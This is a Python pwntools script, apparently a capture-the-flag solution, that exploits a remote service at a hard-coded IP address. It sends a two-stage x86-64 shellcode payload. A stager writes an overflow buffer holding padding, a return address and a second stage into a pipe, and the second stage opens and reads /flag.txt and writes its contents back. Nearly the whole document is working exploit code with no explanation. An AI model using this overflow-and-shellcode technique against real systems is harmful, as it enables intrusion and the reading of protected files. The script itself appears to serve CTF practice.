from pwn import *
from binascii import hexlify

# Build buf on stack, write it to pipe (fd 6), loop forever
stager = """
xor rbx, rbx
mul rbx

{}

mov rdi, 0x6
mov rsi, rsp
mov rdx, {}
xor rax, rax
mov al, 0x1
syscall

jmp $
"""

# Read /flag.txt into .bss, dup2(stdout, pipefd[1]), write flag to pipe
second_stage = """
mov rax, 0x0000000000000074
push rax
mov rax, 0x78742e67616c662f
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 0x2
syscall

mov rdi, rax
mov rsi, 0x6020B0
mov rdx, 0x30
xor rax, rax
syscall

mov rdi, 0x1
mov rsi, 0x6
xor rax, rax
mov al, 0x21
syscall

mov rdi, 0x6
mov rsi, 0x6020b0
mov rdx, 0x30
xor rax, rax
mov al, 0x1
syscall

xor rax, rax
mov al, 0x3c
syscall
"""

def buf_to_asm(buf):
    pushes = [buf[i:i+8][::-1] for i in range(0, len(buf), 8)][::-1]

    builder = ""
    for p in pushes:
        builder += "mov rax, 0x{}\n".format(hexlify(p.rjust(8, '\x00')))
        builder += "push rax\n"

    return builder

def exploit():
    # Assemble second stage
    second_assembled = asm(second_stage, arch='amd64', os='linux')

    # Pack second stage into stager
    buf = '\x0a' + p32(0xffff) + 'A'*120 + p64(0x400f7b) + second_assembled
    code = buf_to_asm(buf)
    complete_stager = stager.format(code, hex(len(buf)))

    # Assemble everything
    final = asm(complete_stager, arch='amd64', os='linux')

    # Send size and exploit
    size = len(final)
    t.send(p32(size))
    t.send(final)

    flag = t.recv()
    log.info("Flag: {}".format(flag))

    t.close()


if __name__=="__main__":
    t = remote('35.170.14.27', 9002)
    exploit()
